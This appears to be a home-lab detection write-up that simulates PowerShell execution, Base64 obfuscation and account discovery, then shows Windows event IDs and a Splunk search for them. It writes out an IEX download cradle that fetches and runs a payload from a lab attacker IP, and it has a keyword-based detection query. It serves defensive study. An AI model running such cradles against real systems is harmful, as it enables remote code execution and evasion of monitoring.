# PowerShell Execution & Defense Evasion

## Overview
Execution of malicious payloads and enumeration commands using PowerShell. This simulates an adversary using download cradles (`IEX`), obfuscating commands with Base64 (`-EncodedCommand`), and performing post-exploitation reconnaissance.

## MITRE ATT&CK
- **Tactic:** Execution / Defense Evasion / Discovery
- **Technique ID:** T1059.001 / T1027 / T1087
- **Technique Name:** Command and Scripting Interpreter: PowerShell / Obfuscated Files or Information / Account Discovery

## Tools Used
- PowerShell

## Target
- Machine: win-target (192.168.56.101)
- Service/Port attacked: Local Execution

## Attack Execution
### Command Used
```powershell
powershell.exe -EncodedCommand <Base64String>
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.102')
whoami /all
```

### What It Does
Uses PowerShell to download and execute an in-memory payload from the attacker machine (`192.168.56.102`), obfuscates the execution using Base64 encoding to bypass simple string matching, and enumerates local user privileges (`whoami /all`, `net user`).

## Telemetry Generated
| Event ID | Source | Description |
|---|---|---|
| 4688 | WinEventLog:Security | Audit Process Creation. Logs the creation of `powershell.exe`, `whoami.exe`, etc. (Requires command-line auditing enabled via GPO). |
| 4104 | Microsoft-Windows-PowerShell/Operational | Script Block Logging. Captures the full, de-obfuscated PowerShell script block contents just before execution. |

## Detection SPL

```spl
index=* EventCode=4104 ("whoami" OR "Get-LocalUser" OR "DownloadString" OR "EncodedCommand")
| rex field=Message "(?s)text \(\d+ of \d+\):\s*(?<Script_Payload>.*?)\s*ScriptBlock ID"
| table _time, host, Script_Payload
```

## Evidence
See screenshots/phase2/

## Notes
Initial Splunk searches returned zero events because advanced telemetry was disabled by default. 
To resolve this, Group Policy was updated on the target to enable **PowerShell Script Block Logging** and **Audit Process Creation** (with command-line arguments included). The Splunk Universal Forwarder's `inputs.conf` was also updated to explicitly ingest the `Microsoft-Windows-PowerShell/Operational` log path.
